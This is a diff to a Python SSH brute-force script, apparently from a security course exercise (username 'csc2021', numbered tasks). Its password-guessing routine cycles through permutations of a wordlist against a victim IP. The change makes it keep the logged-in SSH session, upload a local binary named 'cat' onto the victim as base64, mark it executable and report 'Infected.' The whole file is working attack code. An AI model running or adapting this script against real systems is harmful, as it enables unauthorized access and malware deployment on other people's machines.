@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from itertools import combinations, permutations
 from argparse import ArgumentParser
+from base64 import b64encode
 import colorama
 import paramiko
 import socket
@@ -19,17 +20,14 @@ BLUE = colorama.Fore.BLUE
 def main():
     parser = ArgumentParser(description="SSH Bruteforce Python script.")
     parser.add_argument("victim", help="IP address of victim.")
-    parser.add_argument("attacker_addr", help="IP address of attacker.")
-    parser.add_argument("attacker_port", help="TCP port of attacker.")
+    parser.add_argument('vars', nargs='*')
 
     # parse passed arguments
     args = parser.parse_args()
     host = args.victim
-    addr = args.attacker_addr
-    port = args.attacker_port
 
-    pwd = task1(host)
-    task2(host, pwd)
+    client = task1(host)
+    task2(client)
 
 
 def task1(host):
@@ -39,15 +37,22 @@ def task1(host):
     for k in range(1, len(data) + 1):
         for comb in combinations(data, k):
             for perm in permutations(comb):
-                if is_ssh_open(host, 'csc2021', ''.join(perm)):
-                    return ''.join(perm)
+                client = try_ssh(host, 'csc2021', ''.join(perm))
+                if client:
+                    return client
 
 
-def task2(host, pwd):
+def task2(client):
+    with open('cat', 'rb') as f:
+        b64 = b64encode(f.read())
+    stdin, stdout, stderr = client.exec_command('base64 -d > cat')
+    stdin.write(b64)
+    client.exec_command('chmod +x cat')
+    print(f'{BLUE}[*] Infected.{RESET}')
     pass
 
 
-def is_ssh_open(hostname, username, password):
+def try_ssh(hostname, username, password):
     # initialize SSH client
     client = paramiko.SSHClient()
     # add to know hosts
@@ -65,11 +70,11 @@ def is_ssh_open(hostname, username, password):
     except paramiko.SSHException:
         print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
         time.sleep(10)
-        return is_ssh_open(hostname, username, password)
+        return try_ssh(hostname, username, password)
     else:
         # connection was established successfully
         print(f"{GREEN}[+] Found combo: {username}:{password}{RESET}")
-        return True
+        return client
 
 
 if __name__ == "__main__":
